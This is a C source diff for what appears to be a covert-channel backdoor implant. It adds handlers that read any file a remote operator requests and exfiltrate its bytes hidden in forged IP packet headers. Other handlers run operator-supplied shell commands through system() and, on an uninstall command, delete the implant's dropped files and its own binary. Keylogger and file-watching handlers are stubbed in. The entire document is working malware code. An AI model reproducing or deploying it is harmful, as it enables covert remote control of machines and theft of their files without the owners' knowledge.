@@ -2,15 +2,20 @@
 #include "runner.h"
 #include "network.h"
 
-#include <errno.h>
 #include <arpa/inet.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <limits.h>
 #include <netinet/ip.h>
 #include <netinet/udp.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
 #include <sys/socket.h>
 #include <sys/time.h>
 #include <unistd.h>
+
+#define DATA_BUF_SIZE 8192
 
 void print_blob(struct Blob *blob) {
     printf("Data1: %u\n", blob->data1);
@@ -110,6 +115,7 @@ int runner_recv(struct Context *ctx, struct List *list) {
 
             blob->seq_num = ntohs(udp->source);
             blob->marked = 0;
+            list->list_size++;
         }
 
     }
@@ -145,10 +151,12 @@ int runner(struct Context *ctx) {
         switch (cmd_list.type) {
             case CMD_UNINSTALL:
                 printf("Uninstall command received\n");
+                cmd_uninstall(ctx);
                 run = 0;
                 break;
             case CMD_REQ_FILE_NAME:
                 printf("Request file name received\n");
+                cmd_req_file_name(ctx, &cmd_list);
                 break;
             case CMD_SEND_FILE_NAME:
                 printf("Send file name received\n");
@@ -156,20 +164,24 @@ int runner(struct Context *ctx) {
                 break;
             case CMD_START_KL:
                 printf("Start kl command received\n");
+                // cmd_start_kl(ctx, &cmd_list);
                 break;
             case CMD_START_WATCH_FILE:
                 printf("Start watch file command received\n");
+                // cmd_start_watch_file(ctx, &cmd_list);
                 break;
             case CMD_START_WATCH_DIR:
                 printf("Start watch directory command received\n");
+                // cmd_start_watch_dir(ctx, &cmd_list);
                 break;
             case CMD_REMOTE_RUN:
                 printf("Remote run command received\n");
+                cmd_remote_run(ctx, &cmd_list);
                 break;
             case CMD_DISCONNECT:
                 printf("Disconnect command received\n");
                 free_list(&cmd_list);
-                return 1;
+                return 1; // return 1 on disconnect, back to waiting for knock
             default:
                 printf("Unknown command received\n");
                 break;
@@ -179,6 +191,152 @@ int runner(struct Context *ctx) {
 
     }
 
+    return 0; // return 0 on uninstall command, runner ends
+}
+
+int cmd_req_file_name(struct Context *ctx, struct List *list) {
+    // open the file in read only
+    // send REP_REQ_FILE_DATA
+    // encode, send data (rep_req_file_data)
+    // send TERM
+
+    const int PATH_SIZE = 256;
+    char file_path[PATH_SIZE];
+    memset(file_path, 0, PATH_SIZE);
+
+    char *ptr = file_path;
+    struct Blob *curr = list->head;
+    while (curr) {
+        // Only copy non-null bytes
+        if (curr->data1 != 0) *ptr++ = curr->data1;
+        if (curr->data2 != 0) *ptr++ = curr->data2;
+        curr = curr->next;
+    }
+
+    *ptr = '\0'; // Null terminate
+
+    printf("Attempting to open file: %s", file_path);
+    const int file_fd = open(file_path, O_RDONLY);
+    if (file_fd < 0) {
+        fprintf(stderr, "open file failed\n");
+        return -1;
+    }
+
+    char ip_buffer[IP_ADDR_LEN] = {0};
+    uint8_t data_buffer[DATA_BUF_SIZE] = {0};
+    int ret;
+
+    ret = encode_ip(ip_buffer, rand_ip_octet(ctx), 0, 0, REP_REQ_FILE_DATA);
+    if (ret < 0) {
+        fprintf(stderr, "encode cmd failed\n");
+    }
+    send_packet(ctx, ip_buffer);
+    // send file data
+    // while not eod, get the next two bytes, encode, ship it
+
+    ssize_t bytes_read;
+    while ((bytes_read = read(file_fd, data_buffer, DATA_BUF_SIZE)) > 0) {
+        for (ssize_t i = 0; i < bytes_read; i += 2) {
+            if (i == bytes_read - 1) {
+                // Only one byte left
+                ret = encode_ip(ip_buffer, rand_ip_octet(ctx), rand_ip_octet(ctx), data_buffer[i], 0);
+            } else {
+                // Two bytes available
+                ret = encode_ip(ip_buffer, rand_ip_octet(ctx), rand_ip_octet(ctx), data_buffer[i], data_buffer[i+1]);
+            }
+            if (ret < 0) {
+                fprintf(stderr, "encode data failed\n");
+            }
+            send_packet(ctx, ip_buffer);
+        }
+    }
+
+    // send TERM
+    ret = encode_ip(ip_buffer, rand_ip_octet(ctx), 1, 0, 0);
+    if (ret < 0) {
+        fprintf(stderr, "encode term failed\n");
+    }
+    send_packet(ctx, ip_buffer);
+
+    // might need a strong wait here
+    close(file_fd);
+    return 0;
+}
+
+int cmd_remote_run(struct Context *ctx, struct List *list) {
+    if (!list || !list->head) {
+        fprintf(stderr, "Remote run list NULL\n");
+        return -1;
+    }
+
+    const char *cat_str = " > output.txt";
+
+    // Each Blob contributes 2 chars, plus one for terminating null
+    size_t ret_size = list->list_size * 2 + 1;
+    char *result = malloc(ret_size + strlen(cat_str));
+    if (!result)  {
+        fprintf(stderr, "malloc failed\n");
+        return -1;
+    }
+
+    char *ptr = result;
+    struct Blob *curr = list->head;
+    while (curr) {
+        // Only copy non-null bytes
+        if (curr->data1 != 0) *ptr++ = curr->data1;
+        if (curr->data2 != 0) *ptr++ = curr->data2;
+        curr = curr->next;
+    }
+
+    *ptr = '\0'; // Null terminate
+
+    // Concatenate the command string
+    strcat(result, cat_str);
+    printf("Executing command: %s", result);
+    // Execute the command
+    int ret = system(result);
+
+    // TODO: send output.txt
+
+    free(result);
+    return ret;
+}
+
+int cmd_uninstall(struct Context *ctx) {
+    struct created_files *curr = ctx->head;
+    while (curr) {
+        if (unlink(curr->file_path) == 0) {
+            printf("Deleted: %s\n", curr->file_path);
+        } else {
+            if (errno == ENOENT) {
+                // File not found, just skip
+                printf("File not found (already deleted?): %s\n", curr->file_path);
+            } else {
+                // Other errors are reported, but program continues
+                perror(curr->file_path);
+            }
+        }
+        curr = curr->next;
+    }
+
+    char self_path[PATH_MAX];
+
+    ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path)-1);
+    if (len == -1) {
+        perror("readlink");
+        return 1;
+    }
+    self_path[len] = '\0';
+
+    if (unlink(self_path) != 0) {
+        perror("unlink");
+        return 1;
+    }
+
+    printf("Deleted self: %s\n", self_path);
+
+    // Continue running safely
+    printf("Exiting\n");
     return 0;
 }
 
